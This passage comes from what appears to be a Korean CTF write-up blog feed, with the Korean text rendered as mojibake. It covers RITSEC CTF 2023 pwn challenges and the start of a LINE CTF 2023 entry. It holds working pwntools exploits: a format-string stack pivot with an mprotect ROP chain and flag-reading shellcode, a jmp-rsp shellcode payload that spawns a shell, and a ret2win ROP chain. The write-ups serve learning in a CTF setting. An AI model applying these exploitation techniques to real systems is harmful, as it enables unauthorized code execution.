p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line"><span class="comment"># ì—¬ê¸°ì„œ mainì˜ 24 lineì˜ lenì´ 19ë¡œ ê³ ì •ë¨.</span></span><br><span class="line"><span class="comment"># ë’¤ì— printfì—ì„œ 17ìžë¡œ ë³´ë‚´ì•¼í•˜ëŠ”ë° ëª¨ìžëžŒ.</span></span><br><span class="line"><span class="comment"># ì´ë¥¼ ìœ„í•´ì„œ 1. aawë¥¼ ì´ìš©í•´ì„œ lenì— í° ìˆ˜ ë„£ê¸°. 2. fgetsë¡œ ë®ê¸° ì „ì— ë­”ê°€ ë” ì¶”ê°€ì ìœ¼ë¡œ ë³´ë‚´ì¤˜ì„œ lenì´ ë” ê¸´ ê¸¸ì´ë¡œ ê³ ì •ë˜ë„ë¡</span></span><br><span class="line"><span class="comment"># 2ë²ˆ ë°©ë²•ì„ ì±„íƒí•˜ì˜€ìŒ. ê·¸ì¹˜ë§Œ ë„ˆë¬´ í° ìˆ˜ ë³´ë‚´ë©´ fgets ê¸¸ì´ ì œí•œì— ê±¸ë¦¬ë‹ˆ ì ë‹¹í•œ ìˆ˜ë¥¼ ë³´ë‚´ì•¼ í•¨</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì´ì œ fgets ëŒ€ì‹  getsê°€ ì‹¤í–‰ë˜ë‹ˆ bofê°€ í„°ì§€ëŠ” ìƒí™©</span></span><br><span class="line"><span class="comment"># printf (fsbê°€ í„°ì§): rbp ë³€ê²½ -&gt; íë¦„ì´ bss ì˜ì—­ìœ¼ë¡œ ë°”ë€ë‹¤. (ìŠ¤íƒ í”¼ë´‡íŒ… ë‘ ë²ˆ í•  ê²ƒìž„)</span></span><br><span class="line"><span class="comment"># ì²« ë²ˆì§¸ ìŠ¤íƒ í”¼ë´‡íŒ…: bss ì˜ì—­ìœ¼ë¡œ ì´ë™í•´ì„œ pop_rsp ì‹¤í–‰</span></span><br><span class="line"><span class="comment"># ë‘ ë²ˆì§¸ ìŠ¤íƒ í”¼ë´‡íŒ…: ë‹¤ì‹œ ìŠ¤íƒìœ¼ë¡œ ëŒì•„ì™€ì„œ ë‚¨ì€ íŽ˜ì´ë¡œë“œ ì‹¤í–‰</span></span><br><span class="line"><span class="comment"># payload : mprotectë¡œ ë²„í¼ ê¶Œí•œ ë³€ê²½í•´ì£¼ê³  ê·¸ ë²„í¼ì— gets í•¨ìˆ˜ë¡œ ìž…ë ¥ì„ ë°›ì„ ê²ƒ.</span></span><br><span class="line"><span class="comment"># gets í•¨ìˆ˜ ìž…ë ¥ìœ¼ë¡œ flag orw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ìŠ¤íƒì— ìžˆëŠ” rbp ì£¼ì†Œë¥¼ bss ì˜ì—­ìœ¼ë¡œ ë°”ê¾¼ë‹¤.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ln -&gt; 8 byte ì”€</span></span><br><span class="line"><span class="comment"># hn -&gt; 2 byte ì”€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x404820:       0x0000000042424244</span></span><br><span class="line"><span class="comment"># calc_checksumì˜ rbpëŠ” ì´ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ í•¨ìˆ˜ì˜ &lt;rbpê°€ ì €ìž¥ëœ ì£¼ì†Œ&gt;</span></span><br><span class="line"><span class="comment"># aì£¼ì†Œ(rsp) : use_packet í•¨ìˆ˜ì˜ rbp</span></span><br><span class="line"><span class="comment"># bufì™€ aì£¼ì†Œì˜ ì˜¤í”„ì…‹ì€ 0x90</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># ì´ê±¸ ì•ˆí•˜ë©´ calc_checksumì˜ free(printf)ê°€ í˜¸ì¶œì´ ì•ˆë¨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># ì‹¤í–‰í• ìˆ˜ ìžˆë„ë¡ ê¶Œí•œ ë°”ê¿”ì£¼ê³ </span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># ì—¬ê¸°ì— ì‰˜ì½”ë“œ ìž…ë ¥ í›„</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># ì í”„</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&#x27;sub rsp, 0x100&#x27;</span></span><br><span class="line">    + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>)</span><br><span class="line">    + shellcraft.read(<span class="number">3</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - assembly-hopping (shellcode)</title>
      <link href="/230412-ritsecctf2023-2assembly-hopping/"/>
      <url>/230412-ritsecctf2023-2assembly-hopping/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Doesnâ€™t everyone love assembly?<br><code>nc assembly-hopping.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[132 solves &#x2F; 279 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ì¼ë‹¨ ë³´í˜¸ê¸°ë²•ì´ ì•„ë¬´ê²ƒë„ ì—†ë‹¤. ê·¸ë¦¬ê³  ì½”ë“œ ë¶„ì„ì„ í•´ë³´ë©´ <code>gets</code> í•¨ìˆ˜ë¡œ bofê°€ ë°œìƒí•˜ê³  ì•„ëž˜ì™€ ê°™ì€ ê°€ì ¯ì„ ì œê³µí•´ì¤€ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">jmp     rsp</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì´ ë¬¸ì œëŠ”.. í’€ì´ ë°©ë²•ì„ ì„¤ëª…í•˜ê¸°ê°€ ì–´ë µë‹¤.. </p><p><code>rbp</code> ìžë¦¬ì— <code>AAAAAAAA</code>ì„ ë„£ê³  <code>ret</code> ìžë¦¬ì— <code>jmp rsp</code> ê°€ì ¯ì„ ë„£ì–´ì£¼ì—ˆë‹¤. ê·¸ëŸ¬ë‹ˆê¹Œ í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ëŠ” ì‹œì ì— ì‹¤í–‰ë˜ëŠ” ê°€ì ¯ íë¦„ì„ ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">jmp rsp</span><br></pre></td></tr></table></figure><p><code>leave</code>ê°€ ì‹¤í–‰ë˜ë©´ì„œ <code>rbp</code>ê°€ <code>AAAAAAAA</code>ë¡œ ë°”ë€Œê³  <code>ret</code> ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ì„œ <code>jmp rsp</code> ê°€ì ¯ì´ <code>rip</code>ì— ë“¤ì–´ê°€ê³  <code>rsp</code>ê°€ ë‚´ë ¤ê°„ë‹¤. ê·¸ëŸ¬ë©´ <code>jmp rsp</code> ê°€ì ¯ ë’¤ì— ì €ìž¥ëœ ë‚´ìš©ì„ ê°€ë¦¬í‚¨ë‹¤. ì´ ìžë¦¬ì— ì‰˜ì½”ë“œë¥¼ ë„£ìœ¼ë©´ ëœë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xd0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401156</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"><span class="comment"># payload += asm(&#x27;nop&#x27;) * 16</span></span><br><span class="line">payload += asm(shellcraft.sh()) <span class="comment"># here!</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - ret2win</title>
      <link href="/230412-ritsecctf2023-1ret2win/"/>
      <url>/230412-ritsecctf2023-1ret2win/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.<br><code>nc ret2win.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[208 solves &#x2F; 83 points]</li></ul><p>3ì›” ë§ ~ 4ì›” ì´ˆì— ì§„í–‰í–ˆë˜ ì”¨í…ì¸ë° ë‹¤ë¥¸ ë¬¸ì œ í’€ë‹¤ê°€ ì´ì œ ë¡¸ì—…ì„ ì ëŠ”ë‹¤..</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main í•¨ìˆ˜ì—ì„œ <code>gets</code> í•¨ìˆ˜ë¡œ ì¸í•´ bofê°€ ë°œìƒí•œë‹¤. ìµœì¢…ì ìœ¼ë¡œ íë¦„ì„ ëŒë ¤ì•¼ í•˜ëŠ” í•¨ìˆ˜ëŠ” ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">supersecrettoplevelfunction</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]  if you figure out my address, you are hired.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="string">&#x27;\xCA\xFE\xBA\xBE&#x27;</span> &amp;&amp; a2 == <span class="string">&#x27;\xC0\xDE\xBA\xBE&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[!!] You are good but not good enough for my company&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì¸ìžë¥¼ ìž˜ ë§žì¶°ì£¼ê¸°ë§Œ í•˜ë©´ ëœë‹¤. <code>rdi</code>ì— a1ì— í•´ë‹¹í•˜ëŠ” ê°’ì„ ë„£ì–´ì•¼ í•˜ë‚˜, a2ì— í•´ë‹¹í•˜ëŠ” ê°’ì„ ë„£ì–´ì•¼ í•˜ë‚˜ ê°€ë” ê³ ë¯¼ë  ë•Œê°€ ìžˆëŠ”ë° ì´ëŸ´ë• ì–´ì…ˆì„ ë³´ë©´ ë°”ë¡œ ì•Œ ìˆ˜ ìžˆë‹¤.</p><img src="/images/230412-ritsecctf2023-1ret2win/Screenshot 2023-04-12 at 18.24.54.png" width=400/><br><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2win.challenges.ctf.ritsec.club&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4012b3</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xFE\xCA\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4012b1</span>) <span class="comment"># pop rsi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xDE\xC0\x00\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x40101a) # ret</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;supersecrettoplevelfunction&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;function!!&#x27;,payload)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> argument </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LINE CTF 2023 - Simple Blogger (memcpy, +tmi)</title>
      <link href="/230405-linectf2023-simple_blogger/"/>
      <url>/230405-linectf2023-simple_blogger/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1716">https://ctftime.org/event/1716</a></li></ul><blockquote><p>This is my Admin simple blogger. Please take a look and tell me if there are components need to be improved.<br><code>./client_nix 34.146.54.86 10007</code></p></blockquote><ul><li>[25 solves &#x2F; 186 points]</li></ul><p>ì•½ì† ìžˆì–´ì„œ ëŒ€íšŒ ë•ŒëŠ” ì°¸ì—¬ ëª»í•˜ê³  ëŒ€íšŒ ëë‚˜ê³  í’€ì´í•´ë³´ì•˜ë‹¤. ì •ë§ ì—´ì‹¬ížˆ ë¶„ì„í•œ ê²ƒì— ë¹„í•´ í”Œëž˜ê·¸ëŠ” ìƒê°ë³´ë‹¤ ì‰½ê²Œ ì–»ì„ ìˆ˜ ìžˆì—ˆë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|</span><br><span class="line">â”œâ”€â”€ agent</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ admin_janitor.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ cron</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Dockerfile</span><br><span class="line">â”‚Â Â  â””â”€â”€ entrypoint.sh</span><br><span class="line">â”œâ”€â”€ client</span><br><span class="line">â”‚Â Â  â””â”€â”€ client_nix</span><br><span class="line">â”œâ”€â”€ docker-compose.yml</span><br><span class="line">â”œâ”€â”€ init.sql</span><br><span class="line">â”œâ”€â”€ server</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Dockerfile</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ flag</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ nsjail</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ nsjail.cfg</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ server_nix</span><br><span class="line">â”‚Â Â  â””â”€â”€ simple_blogger.db</span><br><span class="line">â”œâ”€â”€ simple_blogger.db</span><br><span class="line">â”œâ”€â”€ start_server.sh</span><br><span class="line">â””â”€â”€ stop_server.sh</span><br></pre></td></tr></table></figure><p>ì¼ë‹¨ ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ íŒŒì¼ë“¤ì„ ì‚´íŽ´ë³´ìž. ì„œë²„ì™€ í´ë¼ì´ì–¸íŠ¸ê°€ ì¡´ìž¬í•œë‹¤. flagëŠ” ì„œë²„ ì¸¡ì— ìžˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„.. ì„œë²„ì˜ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ flagë¥¼ ì½ì–´ì˜¤ê±°ë‚˜ ì‰˜ì„ íšë“í•˜ëŠ” ë¬¸ì œì¼ ê²ƒì´ë¼ ìƒê°í–ˆë‹¤. agent í´ë”ë¥¼ ì¡°ê¸ˆ ë” ë¹¨ë¦¬ ë´¤ìœ¼ë©´ ì½”ë“œë¥¼ ì¡°ê¸ˆ ë” ë¹¨ë¦¬ ìž‘ì„±í•  ìˆ˜ ìžˆì—ˆì„ í…ë°.. &#x3D;ã……&#x3D;</p><p><code>server_nix</code> ì„ ë¶„ì„í•´ë³´ìž. ë¨¼ì € <code>main</code> ì´ë‹¤.</p><img src="/images/230405-linectf2023-simple_blogger/main.png" width=700/><br><p>ë¨¼ì € read í•¨ìˆ˜ë¡œ bufì— ìž…ë ¥ì„ ë°›ê³  <code>sub_4014D2</code> í•¨ìˆ˜ì— input ë³€ìˆ˜ì™€ í•¨ê»˜ ì¸ìžë¡œ ë“¤ì–´ê°„ë‹¤. ì € í•¨ìˆ˜ì˜ ì—­í• ì€ ìž…ë ¥ë°›ì€ buf ë³€ìˆ˜ì—ì„œ input ë³€ìˆ˜ë¡œ ë‚´ìš©ì„ ë³µì‚¬í•œë‹¤. ê·¸ë¦¬ê³  switch ë¬¸ìœ¼ë¡œ 6ê°€ì§€ì˜ ê¸°ëŠ¥ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆëŠ”ë° <code>get_flag</code> í•¨ìˆ˜ê°€ ëˆˆì— ëˆë‹¤. ìµœì¢…ì ìœ¼ë¡œ ì € í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œì•¼í•  ê²ƒ ê°™ì€ë° ìž…ë ¥ê°’ì„ ì–´ë–»ê²Œ ì£¼ë©´ ì¢‹ì„ì§€ <code>sub_4014D2</code> í•¨ìˆ˜ë¥¼ ë¶„ì„í–ˆë‹¤.</p><img src="/images/230405-linectf2023-simple_blogger/sub_4014D2.png" width=600/><br><p>memcpy ë“±ìœ¼ë¡œ input ë³€ìˆ˜ì—ë‹¤ ì—¬ëŸ¬ ë°ì´í„°ë“¤ì„ ë³µì‚¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìžˆê³ , êµ¬ì¡°ì²´ì˜ êµ¬ì¡°ëŠ” <code>parsing_header</code> í•¨ìˆ˜ë¥¼ ë¨¼ì € ë¶„ì„í•´ì„œ ì•Œ ìˆ˜ ìžˆì—ˆë‹¤.</p><img src="/images/230405-linectf2023-simple_blogger/parsing_header.png" width=500/><br><p>ìœ„ í•¨ìˆ˜ì—ì„œ version, operation, length ì˜¤í”„ì…‹ì„ ì•Œ ìˆ˜ ìžˆê³  <code>sub_4014D2</code> í•¨ìˆ˜ì—ì„œ í† í°ì„ ë³µì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ 2ë²ˆì§¸ ì˜¤í”„ì…‹ë¶€í„° 16ë°”ì´íŠ¸ê°€ í† í° ê°’ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìžˆì—ˆë‹¤. ê·¸ë¦¬ê³  ì½”ë“œë¥¼ ë” ë¶„ì„í•˜ë‹¤ë³´ë‹ˆ length ë’¤ì—ëŠ” ë°ì´í„°ì˜ ê¸¸ì´ê°€ ì˜¨ë‹¤. ì•„ì°¸, length ê¸¸ì´ ì œí•œì´ ìžˆëŠ” ê²ƒë„ ê¸°ì–µí•˜ìž.</p><p>ì°¸ê³ ë¡œ <code>((*(buf + 18) &lt;&lt; 8) | *(buf + 19))</code>ì€ ë¹…ì—”ë””ì•ˆìœ¼ë¡œ ìˆ˜ë¥¼ í‘œí˜„í•œ ê²ƒì´ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msg = p64(<span class="number">0x4142434445464748</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">4</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16ë°”ì´íŠ¸ token # 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br></pre></td></tr></table></figure><p>ì´ëŸ°ì‹ìœ¼ë¡œ operationê³¼ msg ê°’ì„ ë°”ê¿”ì£¼ë©´ì„œ ë‚´ê°€ ì›í•˜ëŠ” ê¸°ëŠ¥ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆë‹¤. ë¶„ì„í•˜ë©´ì„œ ë‚´ê°€ ì •ë¦¬í•œ êµ¬ì¡°ì²´ëŠ” ì•„ëž˜ì™€ ê°™ë‹¤. ì°¸ê³ ë¡œ êµ¬ì¡°ì²´ëŠ” í•œ ë²ˆì— ì •ë¦¬í•  ìˆ˜ ìžˆëŠ” ê²ƒì´ ì•„ë‹ˆë¼ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ë„ ë³´ë©´ì„œ ì •ë¦¬í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputMessage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint8_t</span> version;</span><br><span class="line">  <span class="type">uint8_t</span> operation;</span><br><span class="line">  <span class="type">uint8_t</span> token[<span class="number">16</span>];</span><br><span class="line">  <span class="type">uint8_t</span> size[<span class="number">2</span>];</span><br><span class="line">  <span class="type">uint64_t</span> data_size;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">1024</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ì´ì œ <code>get_flag</code> í•¨ìˆ˜ë¥¼ ë³´ê³  flagë¥¼ ì‹¤í–‰ì‹œì¼œì•¼í•  ì¡°ê±´ ê°™ì€ ê²ƒì´ ìžˆëŠ”ì§€ ì‚´íŽ´ë³´ìž.</p><img src="/images/230405-linectf2023-simple_blogger/get_flag.png" width=700/><br><p><code>check_auth(token_input)</code>ì´ 1ì´ë©´ flagë¥¼ ì¶œë ¥í•´ì£¼ëŠ”ë° ì´ëŠ” privê°€ 1ì¸ ê²½ìš°, ì¦‰ adminì¸ ê²½ìš°ë¥¼ ì˜ë¯¸í•œë‹¤. ì°¸ê³ ë¡œ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ privë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì€ databaseì—ì„œ ì¿¼ë¦¬ë¥¼ ë‚ ë ¤ì„œ ê°€ì ¸ì˜¤ëŠ”ë° ì•„ëž˜ì™€ ê°™ì´ ìƒê²¼ë‹¤.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> priv <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> token <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>í•œíŽ¸, adminì˜ privê°€ 1ì´ë‹¤? ì´ê²ƒì€ ì–´ë””ì„œ ì„¸íŒ…ë ê¹Œ. <code>login</code> ê¸°ëŠ¥ì—ì„œ <code>super_admin</code>ì´ë©´ privê°€ 0, <code>admin</code>ì´ë©´ privê°€ 1, ì¼ë°˜ ê³„ì •ì´ë©´ privë¥¼ 2ë¡œ ì„¸íŒ…í•´ì£¼ëŠ” í•¨ìˆ˜ê°€ ì¡´ìž¬í•œë‹¤. ë˜í•œ í† í° ê°’ì„ ìƒì„±í•´ì£¼ê³  ì¶œë ¥ê¹Œì§€ í•´ì¤€ë‹¤. ë§Œì•½ <code>admin</code>ìœ¼ë¡œ ë¡œê·¸ì¸ì— ì„±ê³µí•˜ë©´ ìžì—°ìŠ¤ëŸ½ê²Œ í† í° ê°’ì„ ë¦­í•´ì„œ <code>get_flag</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ë©´ ë˜ì§€ ì•Šì„ê¹Œ? ë¼ê³  ìƒê°í–ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(?, ?)</span><br></pre></td></tr></table></figure><p>ì´ì¯¤ë˜ì–´ì„œ ë¬¸ì œì—ì„œ ì œê³µëœ <code>init.sql</code>ì„ ì‚´íŽ´ë³´ìž.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 